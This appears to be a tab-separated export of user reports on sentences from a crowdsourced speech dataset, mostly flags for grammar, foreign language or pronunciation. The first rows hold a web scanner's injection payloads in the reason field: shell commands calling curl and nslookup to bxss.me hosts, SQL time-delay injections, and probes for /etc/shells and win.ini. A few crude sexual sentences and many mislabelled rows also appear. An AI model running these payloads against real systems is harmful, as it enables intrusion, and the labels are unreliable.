sentence	sentence_id	locale	reason
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language9526300
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%3F.jpg
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%00.jpg
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	Http://bxss.me/t/fit.txt
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	http://bxss.me/t/fit.txt%3F.jpg
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	/etc/shells
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	c:/windows/win.ini
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	bxss.me
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	echo ndsxfn$()\ zdxvmc\nz^xyu||a #' &echo ndsxfn$()\ zdxvmc\nz^xyu||a #|" &echo ndsxfn$()\ zdxvmc\nz^xyu||a #
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	&echo pttrcu$()\ vkmtad\nz^xyu||a #' &echo pttrcu$()\ vkmtad\nz^xyu||a #|" &echo pttrcu$()\ vkmtad\nz^xyu||a #
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	|echo udfejb$()\ dgcdij\nz^xyu||a #' |echo udfejb$()\ dgcdij\nz^xyu||a #|" |echo udfejb$()\ dgcdij\nz^xyu||a #
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	(nslookup -q=cname hittqwhldamqpa12ea.bxss.me||curl hittqwhldamqpa12ea.bxss.me))
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	$(nslookup -q=cname hitlytujeqeghc0efd.bxss.me||curl hitlytujeqeghc0efd.bxss.me)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	&nslookup -q=cname hitlerictennl1621f.bxss.me&'\"`0&nslookup -q=cname hitlerictennl1621f.bxss.me&`'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	&(nslookup -q=cname hitdxpktuczpgc6f73.bxss.me||curl hitdxpktuczpgc6f73.bxss.me)&'\"`0&(nslookup -q=cname hitdxpktuczpgc6f73.bxss.me||curl hitdxpktuczpgc6f73.bxss.me)&`'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	|(nslookup -q=cname hithigfilqoitc2b00.bxss.me||curl hithigfilqoitc2b00.bxss.me)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	`(nslookup -q=cname hiterpbeyanwl4b9ea.bxss.me||curl hiterpbeyanwl4b9ea.bxss.me)`
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	;(nslookup -q=cname hitncotbjkoaq896d7.bxss.me||curl hitncotbjkoaq896d7.bxss.me)|(nslookup -q=cname hitncotbjkoaq896d7.bxss.me||curl hitncotbjkoaq896d7.bxss.me)&(nslookup -q=cname hitncotbjkoaq896d7.bxss.me||curl hitncotbjkoaq896d7.bxss.me)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	apS1EgpO
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1 OR 2+645-645-1=0+0+0+1 -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1 OR 2+150-150-1=0+0+0+1
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1' OR 2+485-485-1=0+0+0+1 -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1' OR 2+28-28-1=0+0+0+1 or 'sWcFAjSS'='
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1" OR 2+128-128-1=0+0+0+1 -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	if(now()=sysdate(),sleep(15),0)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	1 waitfor delay '0:0:15' -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	TqX7I5Gx'; waitfor delay '0:0:15' -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	IPhutiFJ' OR 684=(SELECT 684 FROM PG_SLEEP(15))--
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	peYnjJTx') OR 153=(SELECT 153 FROM PG_SLEEP(15))--
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	7GoA03g1')) OR 157=(SELECT 157 FROM PG_SLEEP(15))--
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	1'"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	@@DtTzO
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
Lysenko, Columbia Univ.	de4e8215d69472433a90ccb16c05e6fbba8ab9741befae13434e58bbc266859b	en	grammar-or-spelling
The water chain appears to be a conserved feature of cyt f.	ddeb4adc5e30fd65d73f6df0da0c6781a8ddf7deecfdbe531b7aae66036c3799	en	grammar-or-spelling
Mrs. Reid appeared behind the bar.	de5b49ad9afc58dd602fcb8333a4e9915330e3babb196c9a9d86a54be70c0021	en	grammar-or-spelling
کچھ کھانے کی خواہش ہے؟ 
	59e732d0ff65777ff81fbfd01d67f8c1f585e97369d3e7b462004a9342db674a	en	sc-different-language
. زندگی کو بے فکری سے گزاریں۔	5a90cd1b9619453524b1e62ac539689af4f349d14526fe7ae997f81699386df0	en	sc-different-language
آپ کا نام کیا ہے؟
	5b429861462cb47813b65a2ed45cc2a329f99a74619f65ad26526996153c21a9	en	sc-different-language
. اپنے اہم لکشیوں کو برآمد کریں۔
	5b9246c4e295d5bed521c9c625b8c59f63e6ee658fe01b46801d96fef11c2e32	en	sc-different-language
کتابوں کی خریداری کرنی ہے.
	5ffebd83e041195f1b8fcbfe14b89f452e94bbab9d4b76557e4f6eed3ce22281	en	sc-different-language
کچھ لذیذ کھانا پسند ہے.
	60807f66b662f0c0022451b3f56fd66589afd674df0adcc69cc203ad6ada3eb2	en	sc-different-language
اتنی جلدی کیوں؟	611fa41107f25e4de26e370c4b05026b231107a4fb2b5f609c5270049ac857e5	en	sc-different-language
برف باری بہت خوبصورت ہے.
	612d5c8d6c6349f4c421290ab7e2847c0b0208fe731498317c1bfc5ef1e999e2	en	sc-different-language
دوسروں کے ساتھ احترام کا اظہار کریں اور ان کے ساتھ اچھے تعامل کریں۔

	61764a05edcf105d3a6f17a550858f73c5490b8237ef163aa68b96894b7021ae	en	sc-different-language
وہ اپنی ماں کا ساتھ ہے.
	617d927918e24eca20e18e4516d637d83d964d810f426e28634538ebe25f6407	en	sc-different-language
Frieze (textile)	ded4c4711d9cbb19f54035e04623b278c811845bd7d10fc60d7669e78b595aa7	en	grammar-or-spelling
He completed Phd.	ded93e571accb840d077a4475f1aa855f2613ce7aa73650f0a0ba7117195e617	en	grammar-or-spelling
The construction was carried out by Fr.	dedc09d90c40c251717101e90b048bb8e6166f8e88617056f9a62f11493e16c4	en	grammar-or-spelling
Like all stations in the Market Street Subway, Embarcadero has a tri-level configuration.	df37c1964a0e9ae64f8495ed9ec60eff43df2ce7c324b4eb6486f03c8253ebc4	en	difficult-pronounce
During this period he accompanied Maximilian on his Bohemian campaign.	df2ee0a73b3fb90ed359d6bdacab6e5aca63397a2c1439e6198257fa3673abee	en	difficult-pronounce
Most staphylinoids are middle-sized or small beetles with a pair of shortened elytra.	df37fe75e49ae223de28acb070dea8213ad31d834aef7201ecad18a4c091d549	en	difficult-pronounce
Manumaleuna recorded a season-high four receptions against the Green Bay Packers.	def13f02ffa444f163ab94b38a62d3e647b942501076ed9665a0f29015b5e369	en	difficult-pronounce
Please do not touch my penis. 	22494f3988b0022d454d8a49b1c78a535048fa970b0c25dc286d831df3636c4d	en	Mentioned touching penis
اتنی جلدی کیوں؟	611fa41107f25e4de26e370c4b05026b231107a4fb2b5f609c5270049ac857e5	en	sc-different-language
برف باری بہت خوبصورت ہے.
	612d5c8d6c6349f4c421290ab7e2847c0b0208fe731498317c1bfc5ef1e999e2	en	sc-different-language
دوسروں کے ساتھ احترام کا اظہار کریں اور ان کے ساتھ اچھے تعامل کریں۔

	61764a05edcf105d3a6f17a550858f73c5490b8237ef163aa68b96894b7021ae	en	sc-different-language
وہ اپنی ماں کا ساتھ ہے.
	617d927918e24eca20e18e4516d637d83d964d810f426e28634538ebe25f6407	en	sc-different-language
اے  اللہ ھمیں سیدھا راستہ دِکھاـ	627cde71fce0c7707f0a905a4b526248b2020c96bad48ae6b4465daa966959c2	en	sc-different-language
Maldives Structural Products Pvt.	df3938ed6cf5df7b96a6a3f3c0490489dee4a0884456e5468166a6a6512a0490	en	grammar-or-spelling
I want you to cum inside me!	676a52b2a6d26768bd2521a0fe81cbc4bd19470cc0924b892a0a7244367eafd7	en	offensive-language
He did not remarry, although he had illegitimate children with his mistress.	df67d1c0b22084dcdbe7192e0c37f95b01fd2160a9455e6e3398b8c970fc1a35	en	CBDGFSREDA ,LOP NB BVHGFDTDRFRGRTRFDCVSREDSAW12
Moreover, in his Damit wir nicht vergessen!	dbfd6b96dc4e8299ee4e203f5106c848bc78ff414338be8de0f217d50169faad	en	different-language
Bis kurz vor Exitus.	6d1de9c9c01ab997e6aa3ffead6ca79cc3565f1935316ea7a224f416c60971be	en	sc-different-language
یہ کتاب بہت مفہوم ہے.
	6e2732fd60355818af1e09b14c849f630011fe9fbba8624c442dfc2fc3ae7baa	en	sc-different-language
دوسروں کی مدد کریں اور ان کی خوشیاں بڑھائیں۔	6e49f5f101a7b700880d7d4aad8184561f6dd25f51198a46c5f134ae8b3af61b	en	sc-different-language
. زندگی کو اپنے اہم مقاصد تک پہنچائیں۔
	6f03abcaafff7c93552aa8c80418d0f58259d44c9af1036e761b83455a562161	en	sc-different-language
ان کی میہندی کل منائی جائے گی۔ 
	704c80187d6f30c40a1ca684839e20aadfc54b53ca58fd6a382b596bc672d3e4	en	sc-different-language
کامیابی کی راہوں پر اقدام بڑھائیں اور مقصد تک پہنچیں۔

	7072c68770632444d5a812a7b47a969e69dbee5843f3d9f3c0e32c2982d9b03a	en	sc-different-language
. محبت کا اظہار خوشبوداری کی طرف راہتا ہے۔
	7097f3ed893b1da4e4acce0a323f5b654a6d318aa9097d19138826f9b011d552	en	sc-different-language
برائے مہربانی قیمت کو تھوڑا کم کریں۔
	70bcbe617256154750a2684de43e8a9fc8ca2c91c2c80e93600a53fda335187d	en	sc-different-language
میں اپنی کتاب دھوندتا ہوں.
	70f74c540ec9ec938940df51c630fb69784201033f7a835fe26c1e221bc3e22b	en	sc-different-language
We should read books 	f222a44380dd537fd70517e9ca8cbf7c1114f28f2b941f1bebfdd56b1c25ba04	en	.
The O'Connor family enjoys hiking, scuba diving, music, and travel.	dfb2d44b2f23b959349fc37da763edcac2ddff3a0919980758a56afc7d52c680	en	different-language
The lyrics are unrelated to the Mets or baseball generally.	dfe86dce847fa8d740f7723d68555d5edc7c09e88167fcf7e0affaa64ac5c4b4	en	ciao
Suraj Mal at "Britannica"	dfd8ad27ca24596943e9fe491d26bd06719cc447b3560db0c3f89055de7d699d	en	.
Aesthetics studies the concepts of "beauty" and "harmony.	e0101b09ae8f67e97e8b0fd43a0fe6f1055cc222f8f1b5eb5715d6c371b20766	en	"
Andrew Gleason had no PhD, but considered Mackey to be his advisor.	dfe9a2ef7c767ed7b9fe38cceef0d741216d2eb85f009607336df644188beb8d	en	grammar-or-spelling
Torreense.	e01bfff782e21549600188dbbab4036d24b035fd9c965f6a712ae88bee4feefa	en	different-language
This production propelled the career of William Christie and his ensemble Les Arts Florissants.	e017a7d8b79a2274ceb0e2b36e6e4540e9656da91126bf885ec58d55185037a7	en	different-language
Fessendent received his early education at the Fryeburg Academy in his hometown.	df7e3baa6b6e4db9bed361b3df2a2fb4a36acd2caa6c54b4dc962dd00875a660	en	difficult-pronounce
Pontius Meropius Paulinus was born at Bordeaux, in southwestern France.	e01c7a061d60140cddb5739b35f8cab753732206054f95ef7debf7c5439f336c	en	difficult-pronounce
Blumlein envisaged introduction of surround sound in the film industry.	e009559c8afcdb8437bfed4b426bc0c9f422a57715c572b064ff7f029fec120f	en	difficult-pronounce
Anagnostakis' poetry has been described as "terse".	dfefb3f3f0fc0e03cb067eab3bd35c815115236b7aac4f639d245731b90e0017	en	difficult-pronounce
For this reason Thoth was universally worshipped by ancient Egyptian scribes.	dffee04072a5de95cc819108b44e6b036a5d4693754a0ce931283e1d7a173104	en	difficult-pronounce
If the connective nerve tissues in the trachea degenerate it causes tracheomalacia.	e00990495440f37bd87b57acdfcc0664a287e6d54fb8c0cac74b03eafb48db8f	en	difficult-pronounce
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	different-language
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	difficult-pronounce
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	grammar-or-spelling
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	offensive-language
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	good direction speaking
Excuses, ik heb nu even geen tijd, ik moet de kinderen van school halen.	5605e8d3d8fc91cac938e64693a8048295d7f3e8e42eb96c4f582af0f602ce6f	en	sc-different-language
Sentences contributed here will be added to a publicly available licensed dataset	b240bd7734b69c3a43ac6b715c2f2915a243fc7563246cac22c7872080280091	en	.
Talk to a human	c0a43fa49fbf452ed09cbd4ce8f5b87502bf4b2aca5b1c549fab70a5ea9dfcd5	en	.
Tra i due litiganti il terzo gode	c1f740a930048a3921e195f69bf43cc9eb9471dbb972e553e915429aee7c7b41	en	sc-different-language
Fatal poisoning in humans is very rare, usually occurring after consuming yew foliage.	e10b2f02ec6848ef1c86f70b59498f2e6f668919118952b5e60142cd68bbd5f9	en	different-language
Fatal poisoning in humans is very rare, usually occurring after consuming yew foliage.	e10b2f02ec6848ef1c86f70b59498f2e6f668919118952b5e60142cd68bbd5f9	en	c
It means Fuck the Army.	e0f666aa9a3642b7cd8beac2a4006794b5c0b65ebcf918fcb23e4a751bda7c85	en	grammar-or-spelling
The son of Rev.	e0f8f91692f598a74eb6ffb1d14cbb9b4726dc83e3789ba1f96e70616528fd0e	en	grammar-or-spelling
Kaplan wove his New Yorker cartooning into "Seinfeld" with the episode, "The Cartoon.	e1078e61cb9320bcadba38b49f534fa0e6db1ad237489bcc6297650b4471d3c7	en	grammar-or-spelling
